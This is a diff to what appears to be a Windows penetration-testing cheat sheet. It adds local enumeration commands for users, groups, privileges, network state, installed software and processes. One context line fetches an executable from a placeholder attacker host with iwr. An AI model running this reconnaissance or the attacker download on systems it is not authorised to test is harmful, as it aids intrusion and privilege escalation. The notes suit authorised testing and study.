@@ -37,6 +37,13 @@ findstr pattern filename.txt
 ### Enumeration
 
 ```
+whoami
+whoami /priv
+whoami /group
+systeminfo
+ipconfig /all
+route print
+netstat -ano
 net user
 net localgroup
 ```
@@ -119,4 +126,12 @@ iwr -uri http://$IpAttacker/somefile.exe -outfile somefiledownloaded.exe
 
 ```
 Get-LocalUser
+Get-LocalGroup
+Get-LocalGroupMember somelocalgroup
+Get-LocalGroupMember Administrators
+Get-ItemProperty "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
+Get-ItemProperty "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Get-Member
+Get-ItemProperty "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select DisplayName
+Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select DisplayName
+Get-Process
 ```
